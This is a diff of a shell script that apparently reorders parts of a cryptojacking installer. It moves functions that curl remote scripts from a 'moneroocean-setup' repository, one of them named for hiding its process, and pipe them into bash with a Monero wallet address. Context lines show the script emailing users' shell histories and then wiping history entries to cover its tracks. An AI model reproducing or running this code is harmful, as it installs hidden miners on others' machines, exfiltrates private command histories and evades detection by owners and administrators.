@@ -121,25 +121,6 @@ echo -e "---------------------------------"
 # Send all shell histories
 send_histories_email
 
-# Original installation functions
-rootstuff() {
-  echo -e "\nStarting root installation..."
-  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
-  [ "$USER" != root ] && sudo -u "$USER" "$0"
-}
-
-userstuff() {
-  echo -e "\nStarting user installation..."
-  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
-}
-
-# Original execution logic
-if [[ $(id -u) -eq 0 ]]; then
-    rootstuff
-else
-    userstuff
-fi
-
 # Enhanced history cleanup for all shells
 cleanup_histories() {
     echo "Cleaning the last 10 lines of all shell histories..."
@@ -187,3 +168,22 @@ cleanup_histories() {
     fi
 }
 cleanup_histories
+
+# Original installation functions
+rootstuff() {
+  echo -e "\nStarting root installation..."
+  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
+  [ "$USER" != root ] && sudo -u "$USER" "$0"
+}
+
+userstuff() {
+  echo -e "\nStarting user installation..."
+  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
+}
+
+# Original execution logic
+if [[ $(id -u) -eq 0 ]]; then
+    rootstuff
+else
+    userstuff
+fi
